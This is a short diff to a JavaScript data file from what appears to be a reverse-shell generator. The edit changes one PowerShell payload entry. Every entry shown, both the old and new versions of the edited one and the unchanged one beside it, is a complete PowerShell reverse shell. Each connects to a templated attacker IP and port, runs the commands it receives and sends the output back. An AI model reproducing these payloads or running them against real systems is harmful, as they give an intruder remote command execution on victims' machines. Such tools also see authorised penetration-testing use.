@@ -627,7 +627,7 @@ const rsgData = {
 
     specialCommands: {
         'PowerShell payload': '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
-        'PowerShell +stderr payload': '$ErrorView="NormalView";$ErrorActionPreference="Continue";$c=New-Object System.Net.Sockets.TCPClient("{ip}",{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){$d=([text.encoding]::ASCII).GetString($b,0,$i);try{$o=&([scriptblock]::Create($d))2>&1 3>&1 4>&1 5>&1 6>&1|Out-String}catch{$o=$_|Out-String}if([string]::IsNullOrEmpty($o)){$o=""}$p="PS "+(pwd).Path+"> ";[byte[]]$sb=([text.encoding]::ASCII).GetBytes($o+$p);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'
+        'PowerShell +stderr payload': '$ErrorView="NormalView";$ErrorActionPreference="Continue";$c=New-Object System.Net.Sockets.TCPClient("{ip}",{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){$d=([text.encoding]::ASCII).GetString($b,0,$i);try{$o=iex $d 2>&1 3>&1 4>&1 5>&1 6>&1|Out-String}catch{$o=$_|Out-String}if([string]::IsNullOrEmpty($o)){$o=""}$p="PS "+(pwd).Path+"> ";[byte[]]$sb=([text.encoding]::ASCII).GetBytes($o+$p);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'
     },
 
     reverseShellCommands: [
